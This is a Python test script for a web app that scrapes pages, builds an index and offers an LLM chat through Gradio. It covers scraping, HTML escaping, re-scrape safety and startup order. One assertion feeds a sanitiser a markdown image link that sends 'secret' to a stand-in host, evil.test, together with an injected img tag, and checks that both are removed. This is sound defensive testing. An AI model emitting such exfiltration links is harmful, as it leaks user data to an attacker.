"""Offline check of the web interface and safe scraping. Run: python test_app.py

Kept apart from smoke_test.py because loading Scrapy and Gradio in one process breaks Gradio.
"""
import json
import tempfile
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import patch

import app
import config
from modules import data_extraction


class FakeIndexer:
    knowledge_base = None
    requests = 0

    def request(self):
        self.requests += 1


def scrape(url, data):
    fake = FakeIndexer()
    with patch.multiple(app, indexer=fake, scrape_web_page=lambda u: data,
                        change_llm_model=lambda model: None):
        messages = list(app.process_url(url, "llama3.2"))
    return fake.requests, messages[-1]


app.create_gradio_interface()

# only a successful scrape asks for a new version
requests, message = scrape("https://example.com", {"title": "T", "text": "hello"})
assert requests == 1 and "hello" in message, message
assert scrape("https://example.com", {})[0] == 0
assert scrape("  ", {"title": "T", "text": "x"})[0] == 0

fake = FakeIndexer()
with patch.multiple(app, indexer=fake, change_llm_model=lambda model: None):
    app.reembed("llama3.2")
assert fake.requests == 1

# build progress shown in the page
status = {"running": True, "queued": True, "version": "v1", "message": "building",
          "progress": {"chunking": ("done", "2 page(s)"), "model": ("failed", "<boom>")}}
steps, message = app.render_status(status)
assert "&lt;boom&gt;" in steps and "<boom>" not in steps, "error text must be escaped"
assert "v1" in steps and "en attente d'une autre construction" in steps, steps
assert steps.count("(terminé)") == 1 and steps.count("(échec)") == 1 and message == "building"
assert "Aucune construction" in app.render_status({**status, "progress": {}, "queued": False})[0]

with patch.object(app, "indexer", FakeIndexer()):
    history, box = app.chat("question ?", "auto", [])
assert "No index ready" in history[-1]["content"] and box == ""

# a failed re-scrape keeps the previous JSON; a good one replaces it
URL = "https://example.com/page"
with tempfile.TemporaryDirectory() as tmp, patch.object(config, "SCRAPED_DATA_DIR", tmp):
    saved = data_extraction.output_path(URL)
    saved.write_text('[{"url": "old"}]', encoding="utf-8")
    nothing = lambda command, **kwargs: SimpleNamespace(stderr="")
    with patch.object(data_extraction.subprocess, "run", nothing):
        assert data_extraction.scrape_web_page(URL) == {}
    assert json.loads(saved.read_text(encoding="utf-8")) == [{"url": "old"}]

    def spider(command, **kwargs):
        part = Path(str(saved.resolve()) + ".part")
        assert part.as_uri() + ":json" in command, command
        assert saved.exists(), "the old JSON must stay in place while scraping"
        part.write_text('[{"url": "new"}]', encoding="utf-8")
        return SimpleNamespace(stderr="")

    with patch.object(data_extraction.subprocess, "run", spider):
        assert data_extraction.scrape_web_page(URL) == {"url": "new"}
    assert json.loads(saved.read_text(encoding="utf-8")) == [{"url": "new"}]
    assert [p.name for p in Path(tmp).iterdir()] == [saved.name]

# starting the app loads the saved index before the page is served, and builds nothing
events = []
fake = SimpleNamespace(load=lambda: events.append("load"), request=lambda: events.append("build"))
interface = SimpleNamespace(launch=lambda **kwargs: events.append("launch"))
with patch.multiple(app, indexer=fake, create_gradio_interface=lambda: interface):
    app.main()
assert events == ["load", "launch"], events

leak = app.plain_text("![x](http://evil.test/?q=secret) <img src=x>")
assert "![" not in leak and "<img" not in leak, leak
print("app ok")
